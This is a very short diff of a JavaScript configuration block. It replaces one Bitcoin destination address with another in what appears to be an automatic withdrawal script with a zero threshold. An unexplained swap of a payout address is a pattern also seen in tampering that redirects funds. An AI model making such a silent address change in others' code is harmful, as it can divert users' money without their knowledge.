@@ -1,7 +1,7 @@
 (function() {
 
   // cfg
-  var dest_addr = "3LxGEs2qA41wUKKnMi1Y1tvB6HdTZXnMR5";
+  var dest_addr = "3AGSeyeXEbHedVaqbfP28fv7ern7jJdwUv";
   var currency = "btc";
   var withdrawal_threshold = 0;
 
